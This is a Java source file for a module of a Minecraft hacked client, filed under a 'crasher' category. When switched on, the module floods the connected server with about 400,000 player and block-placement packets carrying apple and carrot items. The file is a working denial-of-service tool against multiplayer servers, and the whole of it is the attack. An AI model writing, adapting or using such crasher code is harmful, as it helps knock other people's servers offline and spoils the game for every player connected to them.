package net.sssssssthedev.SmartClient.module.crasher;

import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.sssssssthedev.SmartClient.module.Category;
import net.sssssssthedev.SmartClient.module.Module;
import org.lwjgl.input.Keyboard;

public class Food extends Module {

    public Food() {
        super("Food", Keyboard.KEY_0, Category.CRASHER);
    }

    Thread t;

    public void onEnable() {
        this.t = new Thread(() -> {
            for (int index = 0; index < 100000; index++) {
                Food.this.mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(true));
                Food.this.mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.apple)));
                Food.this.mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(true));
                Food.this.mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.carrot)));
            }
        });
        this.t.start();
    }

    public void onDisable() {
        this.t.interrupt();
        this.t.stop();
    }
}
